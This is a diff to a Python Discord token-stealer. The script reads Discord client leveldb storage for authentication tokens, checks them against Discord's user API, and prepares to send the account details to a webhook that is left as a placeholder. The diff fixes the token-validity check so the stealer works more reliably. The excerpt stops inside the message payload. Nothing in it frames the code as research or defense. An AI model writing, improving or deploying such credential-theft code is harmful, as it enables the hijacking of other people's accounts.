@@ -1,6 +1,6 @@
 import os, re, requests, platform
 
-WEBHOOK = "YOUR WEBHOOK LINK HERE"
+WEBHOOK = "YOUR WEBHOOK HERE"
 APPDATA = os.getenv("APPDATA") if platform.system() == "Windows" else os.getenv('XDG_CONFIG_HOME', os.getenv('HOME')+'/.config') if platform.system() == "Linux" else None
 TOKENS = []
 DIRS = [f"{APPDATA}\\Discord\\Local Storage\\leveldb", f"{APPDATA}\\discordcanary\\Local Storage\\leveldb"]
@@ -9,7 +9,7 @@ def post():
     for token in TOKENS:
         _data = requests.get("https://discordapp.com/api/v6/users/@me", headers={"authorization": token})
 
-        if _data.status_code != 404 or _data.status_code != 401:
+        if _data.status_code in [202, 200, 204]:
             _info = _data.json()
             _payload = {"content": f'''
 ```asciidoc
